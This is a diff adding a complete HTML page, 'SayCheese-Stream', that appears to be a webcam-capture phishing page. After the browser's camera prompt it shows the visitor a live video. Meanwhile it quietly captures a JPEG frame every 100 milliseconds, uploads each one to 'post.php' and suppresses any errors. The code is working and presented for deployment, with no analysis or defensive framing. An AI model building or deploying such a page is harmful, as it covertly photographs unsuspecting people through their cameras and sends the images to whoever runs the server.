@@ -1,0 +1,47 @@
+---
+
+
+**saycheese.html**  
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>SayCheese‑Stream</title>
+  <style>
+    body { margin:0; display:flex; align-items:center; justify-content:center;
+           height:100vh; background:#000; }
+    video { max-width:100%; max-height:100%; border:5px solid #fff; }
+  </style>
+</head>
+<body>
+  <video id="videoStream" autoplay playsinline></video>
+
+
+  <script>
+    const video = document.getElementById('videoStream');
+
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        // 1) Show live video
+        video.srcObject = stream;
+
+
+        // 2) OPTIONAL: upload a frame every 100ms
+        setInterval(() => {
+          const canvas = document.createElement('canvas');
+          canvas.width  = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          canvas.toBlob(blob => {
+            fetch('post.php', { method: 'POST', body: blob })
+              .catch(() => {/* silently ignore */});
+          }, 'image/jpeg', 0.7);
+        }, 100);
+      })
+      .catch(err => console.error('Camera error:', err));
+  </script>
+</body>
+</html>
+
